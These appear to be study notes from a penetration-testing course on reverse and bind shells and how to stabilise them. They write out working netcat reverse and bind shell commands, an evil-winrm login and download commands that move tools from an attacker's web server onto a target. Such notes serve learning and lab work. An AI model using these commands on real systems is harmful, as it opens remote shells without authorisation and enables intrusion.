## Two most known types
1. Reverse shells
are when the target is forced to execute code that connects back to your computer. 

  - Example: `sudo nc -lvnp 443` to start listner on attacker's machine, and `nc <LOCAL-IP> <PORT> -e /bin/bash` to set a reverse shell on the target's machine.

2. Bind shells
are when the code executed on the target is used to start a listener attached to a shell directly on the target. This would then be opened up to the internet, meaning you can connect to the port that the code has opened and obtain remote code execution that way.

  - Example: `nc -lvnp <port> -e "cmd.exe"` through a evil-winrm `evil-winrm -i <localIP>-u Adminstrator -p 'Try4ackM3'` on the target machine to set a listening port, and `nc MACHINE_IP <port>` on attacker's machine to connect to the target.

The important thing to understand here is that we are listening on the target, then connecting to it with our own machine.

## Shells can be either interactive or non-interactive
1. interactive: These allow you to interact with programs after executing them. For example, take the SSH login prompt. Examples include: Powershell, Bash, Zsh, sh, or any other standard CLI environment.

2. non-interactive: In a non-interactive shell you are limited to using programs which do not require user interaction in order to run properly, like whoami for example.

## netcat shells stabilisation
### python
1. first step is `python -c 'import pty;pty.spawn("/bin/bash")'` which gets us a better featured bash shell. we might need to replace python with python2 or python3 as required.
2. second step is: `export TERM=xterm` -- this will give us access to term commands such as clear.
3. `stty raw -echo; fg` -- This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). then foregrounds the shell, thus completing the process.
    > Note that if the shell dies, any input in your own terminal will not be visible (as a result of having disabled terminal echo). To fix this, type reset and press enter.

### rlwrap
rlwrap is a program which, in simple terms, gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell. To use rlwrap, we invoke a slightly different listener: `rlwrap nc -lvnp <port>`.

This gives us a much more fully featured shell. This technique is particularly useful when dealing with Windows shells, cuz they are difficult to stabilise. When dealing with a Linux target, it's possible to completely stabilise, by using the same trick as in step three of the previous technique: background the shell with `Ctrl + Z`, then use `stty raw -echo; fg` to stabilise and re-enter the shell.

### Socat
1. we would first transfer a socat static compiled binary up to the target machine. How? set up a web server using `sudo python3 -m http.server 80` and download using `wget <LOCAL-IP>/socat -O /tmp/socat)` or on windows using `Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe`.

    > This technique is limited to Linux targets, as a Socat shell on Windows will be no more stable than a netcat shell.

> With any of the above techniques, it's useful to be able to change your terminal tty size if you want to use something like a text editor. use `stty -a` to show the current values and `stty cols <num>`/`stty rows <num>` to set a new value. 

